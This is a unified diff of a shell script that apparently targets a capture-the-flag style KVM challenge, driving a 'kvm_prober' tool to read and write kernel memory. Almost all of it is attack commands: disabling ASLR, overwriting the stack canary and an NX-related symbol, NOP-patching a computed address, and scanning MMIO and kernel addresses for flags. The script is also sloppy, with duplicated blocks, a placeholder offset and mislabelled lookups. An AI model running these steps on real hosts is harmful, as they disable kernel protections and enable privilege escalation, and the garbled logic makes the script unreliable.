@@ -25,20 +25,9 @@ fi
 echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"
 KERN_VER=$(uname -r)
 
-sleep 2
-# Disable ASLR system-wide
-echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-
-sleep 2
-# Find address of stack guard canary
-CANARY_ADDR=$(nm /root/vmlinux | grep __stack_chk_guard | awk '{print "0x"$1}')
-echo $CANARY_ADDR
-
-
-
 ### ===Install basic build tools===
 apt update -y >/dev/null
-apt install sudo git make xxd gcc python3-venv python3-pip gdb build-essential binutils tar -y >/dev/null || true
+apt install sudo git nm make xxd gcc python3-venv python3-pip gdb build-essential binutils tar -y >/dev/null || true
 apt install -f -y >/dev/null
 
 sleep 2
@@ -92,54 +81,58 @@ echo "Write flag address: 0xffffffff826279a8    0x64279a8"
 echo "Read flag address:  0xffffffff82b5ee10    0x695ee10"
 
 sleep 2
+# Disable ASLR system-wide
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+sleep 5
 # Find address of stack guard canary
 CANARY_ADDR=$(nm /root/vmlinux | grep __stack_chk_guard | awk '{print "0x"$1}')
 echo $CANARY_ADDR
 
-sleep 2
+sleep 5
 # Disable stack canary protection by zeroing it out
 echo "kvm_prober readkvmem $CANARY_ADDR 64"
 kvm_prober readkvmem $CANARY_ADDR 64
 
-sleep 2
+sleep 5
 # Disable stack canary protection by zeroing it out
 echo "kvm_prober writekvmem $CANARY_ADDR AAAAAAAAAA"
 kvm_prober writekvmem $CANARY_ADDR 41414141414141414141
 
-sleep 2
+sleep 5
 # Disable NX protection (if needed)
 NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')
 echo "kvm_prober writekvmem $NX_ADDR AAAAAAAAAA"
 kvm_prober writekvmem $NX_ADDR 41414141414141414141
 
-sleep 2
+sleep 5
 # Disable NX protection (if needed)
 NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')
 echo "kvm_prober writekvmem $NX_ADDR AAAAAAAAAA"
 kvm_prober writekvmem $NX_ADDR 41414141414141414141
 
 
-sleep 2
+sleep 5
 # Find the secure_getenv function in bash
 BASH_BASE=$(ldd /bin/bash | grep libc.so | awk '{print $3}' | xargs nm -D | grep " T _start" | awk '{print $1}')
 echo $BASH_BASE
 
-sleep 2
+sleep 5
 # Calculate address of the environment length check
 echo "CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary"
 CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary
 
-sleep 2
+sleep 5
 # Calculate address of the environment length check
 echo "CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary"
 CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary
 
-sleep 2
+sleep 5
 # Patch with NOP sled to bypass length check
 echo "kvm_prober writekvmem $CHECK_ADDR 90909090909090909090"
 kvm_prober writekvmem $CHECK_ADDR 90909090909090909090
 
-sleep 2
+sleep 5
 echo "[*] Write flags default value"
 echo "deadbeef41424344"
 
@@ -148,40 +141,40 @@ echo "[*] Checking potential addresses for flags"
 # Scanning MMIO regions
 echo "[+] Scanning MMIO region 0x02A27968"
 kvm_prober readmmio_buf 0x02A27968 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning MMIO region 0x0275ef50"
 kvm_prober readmmio_buf 0x0275ef50 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning MMIO region 0x02b5ee10"
 kvm_prober readmmio_buf 0x02b5ee10 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning MMIO region 0x026279a8"
 kvm_prober readmmio_buf 0x026279a8 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning MMIO region 0x64279a8"
 kvm_prober readmmio_buf 0x64279a8 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning MMIO region 0x695ee10"
 kvm_prober readmmio_buf 0x695ee10 64
-sleep 2
+sleep 5
 
 # Scanning kernel memory
 echo "[+] Scanning kernel memory 0xffffffff826279a8"
 kvm_prober readkvmem 0xffffffff826279a8 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning kernel memory 0xffffffff82b5ee10"
 kvm_prober readkvmem 0xffffffff82b5ee10 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning kernel memory 0xffffffff82A27968"
 kvm_prober readkvmem 0xffffffff82A27968 64
-sleep 2
+sleep 5
 
 echo "[+] Scanning kernel memory 0xffffffff8275ef50"
 kvm_prober readkvmem 0xffffffff8275ef50 64
